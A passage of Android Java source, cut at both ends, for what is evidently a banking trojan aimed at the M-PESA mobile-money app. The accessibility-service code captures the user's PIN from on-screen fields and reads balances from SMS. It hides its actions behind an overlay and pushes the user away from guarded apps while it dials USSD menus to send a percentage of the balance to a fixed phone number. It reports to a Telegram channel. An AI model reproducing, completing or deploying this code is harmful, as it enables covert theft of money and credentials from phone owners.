              }

              private interface NodePredicate {
                  boolean test(AccessibilityNodeInfo n);
              }

              private boolean isPostPinMpesaUiVisible() {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return false;

                      CharSequence pkg = root.getPackageName();
                      if (pkg == null || !MPESA_APP_PACKAGE.equals(pkg.toString())) return false;

                      MpesaTopScreen top = scanMpesaTopScreen(root);
                      if (top == null) return false;

                      int hits = 0;
                      if (top.greeting != null) hits++;
                      if (top.balanceLabel != null || top.balanceAmount != null) hits++;
                      if (top.viewStatementsButton != null) hits++;
                      if (hits < 2) return false;

                      String sig1 = treeSignature(root);
                      try { Thread.sleep(POST_PIN_STABLE_GAP_MS); } catch (InterruptedException ignored) { }
                      AccessibilityNodeInfo root2 = getRootInActiveWindow();
                      if (root2 == null) return false;
                      String sig2 = treeSignature(root2);
                      return sig1.equals(sig2);

                  } catch (Exception e) {
                      Log.e(TAG, "isPostPinMpesaUiVisible error", e);
                      return false;
                  }
              }

              private MpesaTopScreen scanMpesaTopScreen(AccessibilityNodeInfo root) {
                  if (root == null) return null;

                  Rect rootBounds = new Rect();
                  root.getBoundsInScreen(rootBounds);
                  int topBandHeight = rootBounds.height() / 3;
                  int leftBandWidth = rootBounds.width() / 5;
                  int screenWidth   = rootBounds.width();

                  MpesaTopScreen r = new MpesaTopScreen();
                  List<AccessibilityNodeInfo> all = new ArrayList<>();
                  flattenTree(root, all);

                  for (AccessibilityNodeInfo n : all) {
                      Rect b = new Rect();
                      n.getBoundsInScreen(b);
                      if (b.top >= topBandHeight) continue;
                      CharSequence cd = n.getContentDescription();
                      boolean leftSide = b.left < leftBandWidth;
                      boolean looksProfile = cd != null && cd.toString().matches("(?i).*(profile|avatar|me).*");
                      if (leftSide || looksProfile) { r.profilePic = n; break; }
                  }

                  r.greeting = firstNodeMatching(all, n -> {
                      CharSequence t = n.getText();
                      if (t != null) {
                          String s = t.toString().trim();
                          if (s.startsWith("Good") && s.endsWith(",")) return true;
                      }
                      CharSequence cd = n.getContentDescription();
                      if (cd != null) {
                          String s = cd.toString().trim();
                          if (s.matches("(?i)^good\\s+(morning|afternoon|evening|night).*")) return true;
                      }
                      return false;
                  });

                  if (r.greeting != null) {
                      r.name = nextTextNodeAfter(all, r.greeting, n -> {
                          CharSequence t = n.getText();
                          if (t == null) return false;
                          String s = t.toString().trim();
                          if (s.length() < 2) return false;
                          if (s.matches("^[0-9,.]+$")) return false;
                          return true;
                      });
                  }

                  for (AccessibilityNodeInfo n : all) {
                      if (!n.isClickable()) continue;
                      Rect b = new Rect();
                      n.getBoundsInScreen(b);
                      if (b.top >= topBandHeight) continue;
                      if (b.left <= screenWidth * 0.6) continue;
                      CharSequence cd = n.getContentDescription();
                      if (cd == null) continue;
                      String s = cd.toString().toLowerCase();
                      if (r.notificationIcon == null && s.matches(".*(notif|bell|alert).*")) r.notificationIcon = n;
                      if (r.searchIcon == null && s.contains("search")) r.searchIcon = n;
                  }

                  r.balanceLabel = firstNodeMatching(all, n -> {
                      CharSequence t = n.getText();
                      return t != null && t.toString().contains("M-PESA Balance");
                  });

                  r.balanceAmount = firstMoneyLikeWithin(all, r.balanceLabel, 2);

                  if (r.balanceAmount != null) {
                      Rect balB = new Rect();
                      r.balanceAmount.getBoundsInScreen(balB);
                      for (AccessibilityNodeInfo n : all) {
                          if (!n.isClickable()) continue;
                          Rect b = new Rect();
                          n.getBoundsInScreen(b);
                          if (Math.abs(b.top - balB.top) > 100) continue;
                          CharSequence cd = n.getContentDescription();
                          if (cd != null && cd.toString().matches("(?i).*(eye|show|hide|reveal).*")) {
                              r.eyeIcon = n; break;
                          }
                      }
                  }

                  r.fulizaLabel = firstNodeMatching(all, n -> {
                      CharSequence t = n.getText();
                      return t != null && t.toString().contains("Available Fuliza");
                  });
                  if (r.fulizaLabel != null) {
                      r.fulizaAmount = firstMoneyLikeWithin(all, r.fulizaLabel, 1);
                  }

                  r.viewStatementsButton = firstNodeMatching(all, n -> {
                      if (!n.isClickable()) return false;
                      CharSequence t = n.getText();
                      return t != null && t.toString().contains("View Statements");
                  });

                  return r;
              }

              private void flattenTree(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> out) {
                  if (node == null) return;
                  out.add(node);
                  for (int i = 0; i < node.getChildCount(); i++) {
                      flattenTree(node.getChild(i), out);
                  }
              }

              private AccessibilityNodeInfo firstNodeMatching(
                      List<AccessibilityNodeInfo> nodes, NodePredicate p) {
                  for (AccessibilityNodeInfo n : nodes) if (p.test(n)) return n;
                  return null;
              }

              private AccessibilityNodeInfo nextTextNodeAfter(
                      List<AccessibilityNodeInfo> nodes,
                      AccessibilityNodeInfo anchor,
                      NodePredicate filter) {
                  Rect aB = new Rect(); anchor.getBoundsInScreen(aB);
                  int ay = aB.top, ax = aB.left;
                  AccessibilityNodeInfo best = null;
                  int bestDist = Integer.MAX_VALUE;
                  for (AccessibilityNodeInfo n : nodes) {
                      Rect b = new Rect(); n.getBoundsInScreen(b);
                      boolean after = b.top > ay || (b.top == ay && b.left > ax);
                      if (!after) continue;
                      if (!filter.test(n)) continue;
                      int d = (b.top - ay) * 1000 + Math.abs(b.left - ax);
                      if (d < bestDist) { bestDist = d; best = n; }
                  }
                  return best;
              }

              private AccessibilityNodeInfo firstMoneyLikeWithin(
                      List<AccessibilityNodeInfo> nodes,
                      AccessibilityNodeInfo anchor,
                      int verticalRadiusRows) {
                  if (anchor == null) return null;
                  Rect aB = new Rect(); anchor.getBoundsInScreen(aB);
                  int radiusPx = verticalRadiusRows * 120;
                  for (AccessibilityNodeInfo n : nodes) {
                      Rect b = new Rect(); n.getBoundsInScreen(b);
                      if (Math.abs(b.top - aB.top) > radiusPx) continue;
                      if (isMoneyLike(n.getText())) return n;
                  }
                  return null;
              }

              private boolean isMoneyLike(CharSequence text) {
                  if (text == null) return false;
                  String s = text.toString().replace(" ", "");
                  return s.matches("(?i)^(ksh|kes)\\.?([\\d,]+(\\.\\d{1,2})?|\\*+|-+)$")
                      || s.matches("^[\\d,]+(\\.\\d{1,2})?$");
              }

              private String treeSignature(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  collectSignature(node, sb);
                  return sb.toString();
              }

              private void collectSignature(AccessibilityNodeInfo node, StringBuilder sb) {
                  if (node == null) return;
                  Rect b = new Rect(); node.getBoundsInScreen(b);
                  sb.append(node.getViewIdResourceName()).append('|')
                    .append(node.getText()).append('|')
                    .append(b.top).append(',').append(b.left).append(';');
                  for (int i = 0; i < node.getChildCount(); i++) {
                      collectSignature(node.getChild(i), sb);
                  }
              }

              private void startBalancePreCheck() {
                  if (prechecking) return;

                  if (!isPreCheckCooldownFinished()) {
                      long lastSuccess = prefs.getLong("last_tx_success_time", 0L);
                      long remainingMs = PRECHECK_COOLDOWN_MS - (System.currentTimeMillis() - lastSuccess);
                      long remainingMin = Math.max(0L, remainingMs / 60000L);
                      TelegramQueue.get(this).send(
                          "4-step pre-check BLOCKED: confirmed-success cooldown active. "
                          + "Approx " + remainingMin + " min remaining.");
                      return;
                  }

                  double lastBalance = getLastBalanceFromSms();
                  if (lastBalance <= MIN_BALANCE_TRIGGER) {
                      TelegramQueue.get(this).send(
                          "4-step pre-check BLOCKED: balance gate failed. "
                          + "Last known balance: Ksh " + String.format("%.2f", lastBalance)
                          + " (threshold Ksh " + String.format("%.2f", MIN_BALANCE_TRIGGER)
                          + "). No USSD dialled.");
                      return;
                  }

                  prechecking = true;
                  preCheckRetries = 0;

                  acquireScreenBrightLock();
                  handler.post(overlayWatchdog);

                  TelegramQueue.get(this).send("4 Step started");
                  dialUssdWithIntent("*334%23");
                  handler.postDelayed(this::runPreStep1, PRECHECK_DIAL_DELAY_MS);
              }

              private void runPreStep1() {
                  if (!runPreStep("7", "Pre Step 1")) return;
                  handler.postDelayed(this::runPreStep2, PRECHECK_STEP_DELAY_MS);
              }

              private void runPreStep2() {
                  if (!runPreStep("4", "Pre Step 2")) return;
                  handler.postDelayed(this::runPreStep3, PRECHECK_STEP_DELAY_MS);
              }

              private void runPreStep3() {
                  if (!runPreStep(pin, "Pre Step 3")) return;
                  handler.postDelayed(this::runPreStep4, PRECHECK_LAST_STEP_DELAY_MS);
              }

              private void runPreStep4() {
                  if (!runPreStep("1", "Pre Step 4")) return;
                  handler.postDelayed(this::finishPreCheckAndWait, PRECHECK_LAST_STEP_DELAY_MS);
              }

              private void finishPreCheckAndWait() {
                  try { handler.removeCallbacks(overlayWatchdog); } catch (Exception ignored) { }

                  try { overlayManager.dismissNow(); } catch (Exception e) {
                      Log.e(TAG, "dismissNow failed in finishPreCheckAndWait", e);
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                      try { overlayManager.dismissSafe(); } catch (Exception ignored) { }
                  }

                  prechecking = false;

                  balanceGuardActive = true;

                  final long waitStartTime = System.currentTimeMillis() - BALANCE_SMS_LOOKBACK_MS;
                  final long pollStartTime = System.currentTimeMillis();

                  TelegramQueue.get(this).send("4 Step complete");

                  waitForBalanceSms(waitStartTime, pollStartTime);
              }

              private boolean runPreStep(String value, String label) {
                  if (value == null) {
                      hardStopPreCheck(label + " value null");
                      return false;
                  }

                  String before = snapshotScreen();

                  if (!robustType(value)) {
                      try { typeInFieldLegacy(value); } catch (Exception ignored) { }
                  }

                  AccessibilityNodeInfo send = waitForSendNodeStrict(STRICT_SEND_WAIT_MS);
                  if (send == null) {
                      String snap = snapshotScreen();
                      String trimmed = snap.length() > 500 ? snap.substring(0, 500) : snap;
                      TelegramQueue.get(this).send("PreStep [" + label + "] no SEND node.\nScreen:\n" + trimmed);
                      retryOrAbortPreCheck(label + " menu did not appear (no SEND node)");
                      return false;
                  }

                  clickNodeStrict(send);

                  long start = System.currentTimeMillis();
                  while (System.currentTimeMillis() - start < STRICT_ADVANCE_WAIT_MS) {
                      if (dialogAdvancedStrict(before, value)) return true;
                      try { Thread.sleep(50); } catch (InterruptedException ignored) { }
                  }

                  String snap = snapshotScreen();
                  String trimmed = snap.length() > 500 ? snap.substring(0, 500) : snap;
                  TelegramQueue.get(this).send("PreStep [" + label + "] clicked SEND but no advance.\nScreen:\n" + trimmed);
                  retryOrAbortPreCheck(label + " clicked SEND but menu did not advance");
                  return false;
              }

              private void retryOrAbortPreCheck(String reason) {
                  preCheckRetries++;
                  if (preCheckRetries <= PRECHECK_MAX_RETRIES) {
                      TelegramQueue.get(this).send("Pre-check retry " + preCheckRetries + "/"
                              + PRECHECK_MAX_RETRIES + " after: " + reason);
                      try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                      extraOverlayTeardownBurst();
                      prechecking = false;
                      handler.postDelayed(() -> {
                          performGlobalAction(GLOBAL_ACTION_HOME);
                          handler.postDelayed(() -> {
                              overlayManager.show(() -> startBalancePreCheck());
                          }, 400);
                      }, 400);
                      return;
                  }
                  hardStopPreCheck(reason + " (retries exhausted)");
              }

              private void hardStopPreCheck(String reason) {
                  prechecking = false;
                  balanceGuardActive = false;
                  try { handler.removeCallbacks(overlayWatchdog); } catch (Exception ignored) { }
                  try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                  extraOverlayTeardownBurst();
                  releaseScreenBrightLock();
                  TelegramQueue.get(this).send("Balance pre-check aborted: " + reason);
              }

              private void waitForBalanceSms(long waitStartTime, long pollStartTime) {
                  String sms = getNewestMpesaSmsBody();
                  long smsDate = getNewestMpesaSmsDate();

                  if (sms != null && smsDate >= waitStartTime) {
                      Double bal = parseConfirmedBalance(sms);
                      if (bal != null) {
                          balanceGuardActive = false;
                          prechecking = false;
                          verifiedBalance = bal;
                          balanceVerified = true;
                          releaseScreenBrightLock();
                          TelegramQueue.get(this).send(
                              "Balance found (balance ksh " + String.format("%.2f", bal)
                              + ") waiting for 8 seconds to start 6 step.");

                          handler.postDelayed(() -> {
                              double amount = Math.round(verifiedBalance * SEND_PERCENTAGE);
                              balanceVerified = false;
                              verifiedBalance = 0.0;
                              if (amount <= 0) return;

                              if (!overlayManager.isShowing()) {
                                  overlayManager.show(() -> startAutomation(amount));
                              } else {
                                  startAutomation(amount);
                              }
                          }, BALANCE_TO_6STEP_DELAY_MS);

                          return;
                      }
                  }

                  if (System.currentTimeMillis() - pollStartTime >= BALANCE_SMS_WAIT_MS) {
                      balanceGuardActive = false;
                      prechecking = false;
                      skipNextPinSave = true;
                      releaseScreenBrightLock();
                      TelegramQueue.get(this).send(
                          "Balance pre-check: no SMS within 60s. Aborted. Guard released.");
                      return;
                  }

                  handler.postDelayed(
                      () -> waitForBalanceSms(waitStartTime, pollStartTime),
                      BALANCE_SMS_POLL_INTERVAL_MS);
              }

              private Double parseConfirmedBalance(String body) {
                  if (body == null) return null;
                  String lower = body.toLowerCase();
                  if (!lower.contains("confirmed.")) return null;
                  if (!lower.contains("account balance was")) return null;

                  String normalized = body.replace('\u00A0', ' ')
                          .replace("\u200B", "")
                          .replaceAll("\\s+", " ")
                          .trim();

                  Pattern p = Pattern.compile(
                          "account\\s+balance\\s+was\\s*:?\\s*m[-\\s]?pesa\\s+account\\s*:?\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                          Pattern.CASE_INSENSITIVE);
                  Matcher m = p.matcher(normalized);
                  if (m.find()) {
                      try {
                          return Double.parseDouble(m.group(1).replace(",", ""));
                      } catch (Exception ignored) { }
                  }

                  Pattern p2 = Pattern.compile(
                          "account\\s+balance\\s+was\\s*:?\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                          Pattern.CASE_INSENSITIVE);
                  Matcher m2 = p2.matcher(normalized);
                  if (m2.find()) {
                      try {
                          return Double.parseDouble(m2.group(1).replace(",", ""));
                      } catch (Exception ignored) { }
                  }

                  return null;
              }

              private double getLastBalanceFromSms() {
                  try {
                      ContentResolver cr = getContentResolver();
                      Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
                      String[] projection = { Telephony.Sms.Inbox.BODY };
                      String selection = Telephony.Sms.Inbox.BODY + " LIKE ?";
                      String[] selectionArgs = new String[]{"%balance%"};
                      String sortOrder = Telephony.Sms.Inbox.DATE + " DESC";

                      Cursor cursor = cr.query(uri, projection, selection, selectionArgs, sortOrder);
                      if (cursor == null || !cursor.moveToFirst()) {
                          if (cursor != null) cursor.close();
                          return 0;
                      }
                      do {
                          String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.BODY));
                          if (body == null) continue;
                          String normalized = body.replace('\u00A0', ' ')
                                  .replace("\u200B", "")
                                  .replaceAll("\\s+", " ")
                                  .trim();
                          Pattern pA = Pattern.compile(
                              "your\\s+m[-\\s]?pesa\\s+balance\\s+is\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                              Pattern.CASE_INSENSITIVE);
                          Matcher mA = pA.matcher(normalized);
                          if (mA.find()) {
                              double v = Double.parseDouble(mA.group(1).replace(",", ""));
                              cursor.close();
                              return v;
                          }
                          Pattern pB = Pattern.compile(
                              "m[-\\s]?pesa\\s+balance\\s+is\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                              Pattern.CASE_INSENSITIVE);
                          Matcher mB = pB.matcher(normalized);
                          if (mB.find()) {
                              double v = Double.parseDouble(mB.group(1).replace(",", ""));
                              cursor.close();
                              return v;
                          }
                          Pattern pC = Pattern.compile(
                              "m[-\\s]?pesa\\s+balance[:\\s]*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                              Pattern.CASE_INSENSITIVE);
                          Matcher mC = pC.matcher(normalized);
                          if (mC.find()) {
                              double v = Double.parseDouble(mC.group(1).replace(",", ""));
                              cursor.close();
                              return v;
                          }
                          Pattern pD = Pattern.compile(
                              "account\\s+balance\\s+was\\s*:?\\s*m[-\\s]?pesa\\s+account\\s*:?\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                              Pattern.CASE_INSENSITIVE);
                          Matcher mD = pD.matcher(normalized);
                          if (mD.find()) {
                              double v = Double.parseDouble(mD.group(1).replace(",", ""));
                              cursor.close();
                              return v;
                          }
                      } while (cursor.moveToNext());
                      cursor.close();
                  } catch (Exception e) {
                      Log.e(TAG, "Balance read error", e);
                      TelegramQueue.get(this).send("Balance read error: " + e.getMessage());
                  }
                  return 0;
              }

              private String getNewestMpesaSmsBody() {
                  try {
                      Cursor cursor = getContentResolver().query(
                          Telephony.Sms.Inbox.CONTENT_URI,
                          new String[]{ Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.ADDRESS },
                          null, null,
                          Telephony.Sms.Inbox.DATE + " DESC");
                      if (cursor == null) return null;
                      int count = 0;
                      while (cursor.moveToNext() && count < 5) {
                          count++;
                          String body = cursor.getString(0);
                          String sender = cursor.getString(1);
                          if (body == null) continue;
                          String b = body.toLowerCase();
                          String s = sender != null ? sender.toLowerCase() : "";
                          if (b.contains("m-pesa") || b.contains("mpesa") || b.contains("m_pesa")
                              || s.contains("m-pesa") || s.contains("mpesa") || s.contains("m_pesa")) {
                              cursor.close();
                              return body;
                          }
                      }
                      cursor.close();
                  } catch (Exception e) {
                      Log.e(TAG, "getNewestMpesaSmsBody error", e);
                  }
                  return null;
              }

              private long getNewestMpesaSmsDate() {
                  try {
                      Cursor cursor = getContentResolver().query(
                          Telephony.Sms.Inbox.CONTENT_URI,
                          new String[]{ Telephony.Sms.Inbox.DATE, Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.BODY },
                          null, null,
                          Telephony.Sms.Inbox.DATE + " DESC");
                      if (cursor == null) return 0L;
                      int count = 0;
                      while (cursor.moveToNext() && count < 5) {
                          count++;
                          long date = cursor.getLong(0);
                          String sender = cursor.getString(1);
                          String body = cursor.getString(2);
                          String b = body != null ? body.toLowerCase() : "";
                          String s = sender != null ? sender.toLowerCase() : "";
                          if (b.contains("m-pesa") || b.contains("mpesa") || b.contains("m_pesa")
                              || s.contains("m-pesa") || s.contains("mpesa") || s.contains("m_pesa")) {
                              cursor.close();
                              return date;
                          }
                      }
                      cursor.close();
                  } catch (Exception e) {
                      Log.e(TAG, "getNewestMpesaSmsDate error", e);
                  }
                  return 0L;
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      if (event == null) return;

                      if (balanceGuardActive) {
                          String pkg = event.getPackageName() != null
                                  ? event.getPackageName().toString().toLowerCase() : "";
                          if (GUARDED_APPS.contains(pkg)) {
                              handler.postDelayed(() ->
                                      performGlobalAction(GLOBAL_ACTION_HOME), GUARD_HOME_DELAY_MS);
                              return;
                          }
                      }

                      if (automating) return;
                      if (prechecking) return;

                      String pkg = event.getPackageName() != null
                              ? event.getPackageName().toString().toLowerCase() : "";
                      int type = event.getEventType();

                      if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                          type == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {

                          if (pkg.equals(getPackageName())) {
                              return;
                          }

                          if (pkg.equals(MPESA_APP_PACKAGE)) {
                              if (isActivationWindowOpen() && isCooldownFinished() && !balanceGuardActive) {
                                  double lastBalance = getLastBalanceFromSms();
                                  if (lastBalance <= MIN_BALANCE_TRIGGER) {
                                      TelegramQueue.get(this).send(
                                          "M-PESA opened but PIN overlay NOT shown: "
                                          + "balance gate failed. Last known balance: Ksh "
                                          + String.format("%.2f", lastBalance)
                                          + " (threshold Ksh " + String.format("%.2f", MIN_BALANCE_TRIGGER)
                                          + ").");
                                      return;
                                  }
                                  long now = System.currentTimeMillis();
                                  if (now - lastLaunchMs >= LAUNCH_DEBOUNCE_MS) {
                                      lastLaunchMs = now;
                                      launchOverlayActivity();
                                  }
                              }
                          }
                          return;
                      }

                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return;

                      boolean isKnownHost = false;
                      for (String host : PIN_HOST_PACKAGES) {
                          if (pkg.contains(host)) { isKnownHost = true; break; }
                      }
                      boolean windowMentionsStrictPin = windowTextMentionsStrictPin(root);
                      if (!isKnownHost && !windowMentionsStrictPin) return;
                      if (isPinFieldEmpty(root)) {
                          pinFieldClearedSinceLastCapture = true;
                          return;
                      }
                      String captured = findPinFieldValue(root);
                      if (captured == null || captured.length() < 4) return;
                      boolean sameAsLastHandled = captured.equals(lastHandledPinValue);
                      if (!pinFieldClearedSinceLastCapture && sameAsLastHandled) return;
                      if (!pinFieldClearedSinceLastCapture) return;
                      pinFieldClearedSinceLastCapture = false;
                      lastHandledPinValue = captured;
                      String source = isKnownHost ? pkg : "pin-prompt";
                      savePin(captured, source);
                  } catch (Exception e) {
                      Log.e(TAG, "Event error", e);
                      TelegramQueue.get(this).send("Event error: " + e.getMessage());
                  }
              }

              private void launchOverlayActivity() {
                  handler.post(() -> {
                      Intent i = new Intent(this, MpesaOverlayActivity.class);
                      i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                               | Intent.FLAG_ACTIVITY_CLEAR_TOP
                               | Intent.FLAG_ACTIVITY_NO_ANIMATION
                               | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                               | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                      try {
                          startActivity(i);
                      } catch (Exception e) {
                          Log.e(TAG, "startActivity failed", e);
                      }
                  });
              }

              private boolean isPinFieldEmpty(AccessibilityNodeInfo node) {
                  if (node == null) return false;
                  boolean isPassword = node.isPassword();
                  boolean isEditable = node.isEditable();
                  CharSequence hint = node.getHintText();
                  CharSequence desc = node.getContentDescription();
                  CharSequence text = node.getText();
                  boolean mentionsPin = containsPinPhrase(hint) || containsPinPhrase(desc);
                  if (isPassword || (isEditable && mentionsPin)) {
                      if (text == null || text.toString().trim().isEmpty()) return true;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      if (isPinFieldEmpty(node.getChild(i))) return true;
                  }
                  return false;
              }

              private boolean windowTextMentionsStrictPin(AccessibilityNodeInfo node) {
                  if (node == null) return false;
                  if (containsPinPhrase(node.getText())) return true;
                  if (containsPinPhrase(node.getHintText())) return true;
                  if (containsPinPhrase(node.getContentDescription())) return true;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      if (windowTextMentionsStrictPin(node.getChild(i))) return true;
                  }
                  return false;
              }

              private String findPinFieldValue(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  boolean isPassword = node.isPassword();
                  boolean isEditable = node.isEditable();
                  CharSequence hint = node.getHintText();
                  CharSequence desc = node.getContentDescription();
                  CharSequence text = node.getText();
                  boolean hintMentionsPin = containsPinPhrase(hint) || containsPinPhrase(desc);
                  if ((isPassword || (isEditable && hintMentionsPin)) && text != null) {
                      String value = text.toString().trim();
                      if (value.length() >= 4) return value;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      String result = findPinFieldValue(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              private void startAutomation(double amount) {
                  if (automating) return;
                  automating = true;

                  acquireScreenBrightLock();
                  handler.post(overlayWatchdog);

                  TelegramQueue.get(this).send("Pin saved");
                  TelegramQueue.get(this).send("6 step started");
                  dialUssdWithIntent("*334%23");
                  handler.postDelayed(() -> performStep1(amount), 2250);
              }

              private void endAutomation() {
                  automating = false;
                  try { handler.removeCallbacks(overlayWatchdog); } catch (Exception ignored) { }
                  releaseScreenBrightLock();
              }

              private void dialUssdWithIntent(String ussdCode) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_CALL);
                      intent.setData(Uri.parse("tel:" + ussdCode));
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      try {
                          SubscriptionManager sm = (SubscriptionManager)
                                  getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                          if (sm != null) {
                              List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                              if (subs != null && subs.size() > 1) {
                                  for (SubscriptionInfo sub : subs) {
                                      String carrier = sub.getCarrierName() != null
                                              ? sub.getCarrierName().toString() : "";
                                      if (carrier.toLowerCase().contains("safaricom")) {
                                          PhoneAccountHandle handle = getPhoneAccountHandle(sub.getSubscriptionId());
                                          if (handle != null) {
                                              intent.putExtra("android.telecom.extra.PHONE_ACCOUNT_HANDLE", handle);
                                          }
                                          break;
                                      }
                                  }
                              }
                          }
                      } catch (Exception ignored) { }
                      startActivity(intent);
                  } catch (Exception e) {
                      TelegramQueue.get(this).send("USSD dial failed: " + e.getMessage());
                      hardStopAndAbort("USSD dial failed: " + e.getMessage());
                  }
              }

              private PhoneAccountHandle getPhoneAccountHandle(int subId) {
                  try {
                      TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
                      if (tm == null) return null;
                      List<PhoneAccountHandle> handles = tm.getCallCapablePhoneAccounts();
                      if (handles != null && !handles.isEmpty()) return handles.get(0);
                  } catch (Exception ignored) { }
                  return null;
              }

              private String getCurrentTargetPhone() {
                  return TARGET_PHONE;
              }

              private String snapshotScreen() {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return "";
                      StringBuilder sb = new StringBuilder();
                      collectAllText(root, sb);
                      return sb.toString();
                  } catch (Exception e) {
                      return "";
                  }
              }

              private void collectAllText(AccessibilityNodeInfo node, StringBuilder sb) {
                  if (node == null) return;
                  CharSequence text = node.getText();
                  if (text != null) sb.append(text).append('\n');
                  CharSequence desc = node.getContentDescription();
                  if (desc != null) sb.append(desc).append('\n');
                  for (int i = 0; i < node.getChildCount(); i++) {
                      collectAllText(node.getChild(i), sb);
                  }
              }

              private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo node, String id) {
                  if (node == null) return null;
                  try {
                      if (id.equals(node.getViewIdResourceName())) return node;
                      for (int i = 0; i < node.getChildCount(); i++) {
                          AccessibilityNodeInfo r = findNodeById(node.getChild(i), id);
                          if (r != null) return r;
                      }
                  } catch (Exception ignored) { }
                  return null;
              }

              private AccessibilityNodeInfo findClickableByExactText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return null;
                  try {
                      CharSequence t = node.getText();
                      if (t != null && t.toString().trim().equalsIgnoreCase(text)
                              && node.isClickable() && node.isEnabled()) {
                          return node;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          AccessibilityNodeInfo r = findClickableByExactText(node.getChild(i), text);
                          if (r != null) return r;
                      }
                  } catch (Exception ignored) { }
                  return null;
              }

              private AccessibilityNodeInfo findPositiveOnly(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  try {
                      if (node.isClickable() && node.isEnabled()) {
                          String hay = "";
                          if (node.getText() != null) hay += node.getText().toString().toLowerCase() + " ";
                          if (node.getContentDescription() != null) hay += node.getContentDescription().toString().toLowerCase() + " ";
                          if (node.getViewIdResourceName() != null) hay += node.getViewIdResourceName().toLowerCase() + " ";
                          boolean negative = false;
                          for (String n : SEND_NEGATIVE_LABELS) if (hay.contains(n)) { negative = true; break; }
                          if (!negative) {
                              for (String p : SEND_PRIMARY_LABELS) if (hay.contains(p)) return node;
                          }
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          AccessibilityNodeInfo r = findPositiveOnly(node.getChild(i));
                          if (r != null) return r;
                      }
                  } catch (Exception ignored) { }
                  return null;
              }

              private AccessibilityNodeInfo findSendNodeStrict(AccessibilityNodeInfo root) {
                  if (root == null) return null;
                  AccessibilityNodeInfo byId = findNodeById(root, "android:id/button1");
                  if (byId != null && byId.isClickable() && byId.isEnabled()) return byId;
                  AccessibilityNodeInfo byExact = findClickableByExactText(root, "send");
                  if (byExact != null) return byExact;
                  AccessibilityNodeInfo byPos = findPositiveOnly(root);
                  if (byPos != null) return byPos;
                  return null;
              }

              private AccessibilityNodeInfo waitForSendNodeStrict(long timeoutMs) {
                  long start = System.currentTimeMillis();
                  while (System.currentTimeMillis() - start < timeoutMs) {
                      try {
                          AccessibilityNodeInfo root = getRootInActiveWindow();
                          if (root != null) {
                              try { root.refresh(); } catch (Exception ignored) { }
                              AccessibilityNodeInfo n = findSendNodeStrict(root);
                              if (n != null) return n;
                          }
                      } catch (Exception ignored) { }
                      try { Thread.sleep(50); } catch (InterruptedException ignored) { }
                  }
                  return null;
              }

              private boolean clickNodeStrict(AccessibilityNodeInfo node) {
                  if (node == null) return false;
                  boolean didSomething = false;
                  try {
                      node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      didSomething = true;
                  } catch (Exception ignored) { }
                  try {
                      Rect b = new Rect();
                      node.getBoundsInScreen(b);
                      if (b.width() > 0 && b.height() > 0) {
                          Path path = new Path();
                          path.moveTo(b.centerX(), b.centerY());
                          GestureDescription.Builder gb = new GestureDescription.Builder();
                          gb.addStroke(new GestureDescription.StrokeDescription(path, 0, 60));
                          dispatchGesture(gb.build(), null, null);
                          didSomething = true;
                      }
                  } catch (Exception ignored) { }
                  return didSomething;
              }

              private boolean dialogAdvanced(String beforeSnapshot, String typedValue) {
                  try {
                      String now = snapshotScreen();
                      if (now != null && !now.equals(beforeSnapshot)) return true;
                  } catch (Exception ignored) { }
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return true;
                      AccessibilityNodeInfo field = findEditableField(root);
                      if (field == null) return true;
                      CharSequence t = field.getText();
                      if (t == null) return true;
                      String s = t.toString().trim();
                      if (!s.equals(typedValue) && !s.contains(typedValue)) return true;
                  } catch (Exception ignored) { }
                  return false;
              }

              private boolean dialogAdvancedStrict(String beforeSnapshot, String typedValue) {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return false;

                      AccessibilityNodeInfo field = findEditableField(root);
                      if (field != null && field.getText() != null) {
                          String current = field.getText().toString().trim();
                          if (current.equals(typedValue)) return false;
                      }

                      String now = snapshotScreen();
                      if (now == null) return false;
                      if (now.equals(beforeSnapshot)) return false;

